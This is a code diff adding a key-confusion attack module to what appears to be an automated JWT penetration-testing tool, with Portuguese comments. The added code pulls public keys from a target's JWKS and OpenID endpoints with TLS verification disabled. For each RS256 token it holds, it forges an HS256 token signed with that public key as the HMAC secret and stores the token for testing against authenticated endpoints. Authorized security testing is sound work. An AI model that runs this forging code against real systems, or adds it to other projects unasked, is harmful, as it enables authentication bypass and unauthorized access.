@@ -328,6 +328,81 @@ def run(context: dict):
             for f in findings:
                 info(f"   🚨 {C.YELLOW}{f['type']}: {f['details'][:60]}{C.END}")
     
+    # V10.4: Key Confusion Attack (RS256 → HS256)
+    info(f"   🔑 {C.CYAN}[V10.4] Testando Key Confusion Attack (RS256→HS256)...{C.END}")
+    try:
+        import base64
+        import hmac
+        import hashlib
+        
+        # Tentar obter chave pública de endpoints comuns
+        public_key = None
+        key_endpoints = [
+            f"https://{target}/.well-known/jwks.json",
+            f"https://{target}/.well-known/openid-configuration",
+            f"https://{target}/jwks.json",
+            f"https://{target}/.well-known/oauth-authorization-server",
+        ]
+        
+        if httpx:
+            with httpx.Client(verify=False, timeout=10) as pk_client:
+                for ep in key_endpoints:
+                    try:
+                        resp = pk_client.get(ep)
+                        if resp.status_code == 200 and "keys" in resp.text:
+                            key_data = resp.json()
+                            if "keys" in key_data and key_data["keys"]:
+                                # Extrair a primeira chave pública
+                                first_key = key_data["keys"][0]
+                                key_info = json.dumps(first_key)
+                                public_key = key_info
+                                all_findings.append({
+                                    "type": "KEY_CONFUSION_POTENTIAL",
+                                    "risk": "HIGH",
+                                    "details": f"Chave pública encontrada em {ep} — testar Key Confusion (RS256→HS256) com esta chave como secret HMAC",
+                                    "endpoint": ep,
+                                    "key_preview": key_info[:200],
+                                })
+                                info(f"   ⚠️ {C.YELLOW}Chave pública encontrada em {ep} — Key Confusion possível{C.END}")
+                                break
+                    except Exception:
+                        pass
+        
+        # Para cada JWT com RS256, gerar um token HS256 usando a public key como secret
+        for token, source in jwts.items():
+            parts = token.split(".")
+            if len(parts) == 3:
+                try:
+                    header_b64 = parts[0] + "=" * (4 - len(parts[0]) % 4)
+                    header = json.loads(base64.urlsafe_b64decode(header_b64))
+                    if header.get("alg") in ["RS256", "RS384", "RS512"] and public_key:
+                        # Gerar token com alg:HS256 e public key como secret
+                        new_header = base64.urlsafe_b64encode(
+                            json.dumps({"alg": "HS256", "typ": "JWT"}).encode()
+                        ).decode().rstrip("=")
+                        
+                        payload_b64 = parts[1]
+                        signing_input = f"{new_header}.{payload_b64}"
+                        signature = base64.urlsafe_b64encode(
+                            hmac.new(public_key.encode(), signing_input.encode(), hashlib.sha256).digest()
+                        ).decode().rstrip("=")
+                        
+                        confused_token = f"{signing_input}.{signature}"
+                        
+                        all_findings.append({
+                            "type": "KEY_CONFUSION_TOKEN",
+                            "risk": "CRITICAL",
+                            "details": "Token HS256 gerado com public key como HMAC secret — testar em endpoints autenticados",
+                            "original_alg": header.get("alg"),
+                            "confused_token_preview": confused_token[:80] + "...",
+                            "source": source,
+                        })
+                        info(f"   🔴 {C.RED}Token Key Confusion gerado (RS256→HS256){C.END}")
+                except Exception:
+                    pass
+    except Exception:
+        pass
+    
     # Testar tokens com alg:none contra o target (se httpx disponível)
     if httpx and all_findings:
         info(f"   🧪 Testando tokens manipulados contra o target...")
